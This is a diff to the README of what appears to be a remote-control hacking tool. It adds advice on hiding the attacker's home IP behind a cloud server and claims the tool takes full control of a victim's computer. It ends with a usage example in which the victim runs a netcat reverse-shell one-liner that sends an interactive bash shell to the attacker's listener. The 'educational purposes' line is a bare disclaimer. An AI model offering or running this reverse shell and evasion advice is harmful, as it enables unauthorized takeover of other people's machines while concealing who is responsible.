@@ -42,9 +42,17 @@ Makesure you add your ip to the victim's command.
 
 * Guidlines 
 
-> Always use a cloud linux machine or another os in the cloud, because when the victim type the command he can grab your home network ip.
+* Always use a cloud linux machine or another os in the cloud, because when the victim type the command he can grab your home network ip.
 
-> And this tool is only for educational purposes.
+* And this tool is only for educational purposes.
+
+* This tool can take the full control of the computer.
+
+* Another thing is that you can start listening on any port.
+ 
+* Also you have to add your ip to the net.py as well as the victim's command.
+
+* And you can use linode, aws or google cloud services to make your cloud machine.
 
     kali@attacker ~ $ python3 listen.py
     kali@victim ~ $ mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc <add your ip> 9999 >/tmp/f  
